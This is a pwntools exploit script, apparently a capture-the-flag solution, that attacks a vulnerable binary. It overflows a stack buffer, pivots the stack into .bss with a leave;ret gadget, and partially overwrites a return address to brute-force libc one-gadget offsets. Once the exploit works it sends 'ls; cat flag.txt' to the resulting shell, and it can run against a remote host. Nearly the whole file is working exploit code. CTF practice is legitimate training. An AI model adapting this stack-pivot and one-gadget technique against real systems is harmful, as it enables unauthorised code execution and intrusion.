#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# tbreak main
b *vuln+29
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)


while True:
    with get_conn(pre_argv, post_argv, gdbscript) as io:
        try:
            r = lambda *a, **k: io.recv(*a, **k)
            rl = lambda *a, **k: io.recvline(*a, **k)
            ru = lambda *a, **k: io.recvuntil(*a, **k)
            cl = lambda *a, **k: io.clean(*a, **k)
            s = lambda *a, **k: io.send(*a, **k)
            sa = lambda *a, **k: io.sendafter(*a, **k)
            sl = lambda *a, **k: io.sendline(*a, **k)
            sla = lambda *a, **k: io.sendlineafter(*a, **k)
            ia = lambda *a, **k: io.interactive(*a, **k)
            rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
            rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
            safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
            ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
            ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


            def trace(func):
                def wrapper(*args, **kwargs):
                    info(f"{func.__name__} {args} {kwargs}")
                    return func(*args, **kwargs)
                return wrapper


            OFFSET = 40

            # s(cyclic(0x60))

            # 0x004011c0: leave; ret;
            leave_ret = 0x004011c0

            # 0x004011e3: pop rbp; ret;
            pop_rbp_ret = 0x004011e3

            s(flat({
                OFFSET-8: exe.bss(0x800),
                OFFSET: 0x4011a9,
            }))

            s(flat({
                OFFSET-8: exe.bss(0xe00),
                OFFSET: exe.sym['main'],
            }))

            s(flat({
                OFFSET-8: exe.bss(0x800-0x20-0x28),
                OFFSET: 0x4011a9,
            }))


            libc_base_local = 0x7ffff7c00000

            gadgets = [
                0x50a39,
                0x50a40,
                0x50a47,
                0x50a4e,
                0x50a53,
                0x50a63,
                0x50a68,
                0x50a6b,
                0x50a70,
                0x80bb5,
                0x80bbc,
                0x80bc3,
                0x80bc6,
                0x80bcb,
                0x80bd0,
                0x80bd5,
                0x80bda,
                0xebc81,
                0xebc85,
                0xebc88,
                0xebce2,
                0xebd38,
                0xebd3f,
                0xebd43,
                0xebd47,
                0x10d9c2,
                0x10d9ca,
                0x10d9cf,
                0x10d9d9
            ]

            g = libc_base_local + gadgets[int(args.X)]

            s(flat(
                cyclic(0x20),
                exe.bss(0xf00), # rbp
                p64(g)[:3]
            ))

            sleep(0.2)
            sl(b'ls; cat flag.txt')

            d = io.stream()
            print(d)

            if b'idek' in d:
                break
        except Exception as e:
            print(f"Exception: {e}")
            continue

# 1/4096 for win, unfortunately, there is a pow on the remote server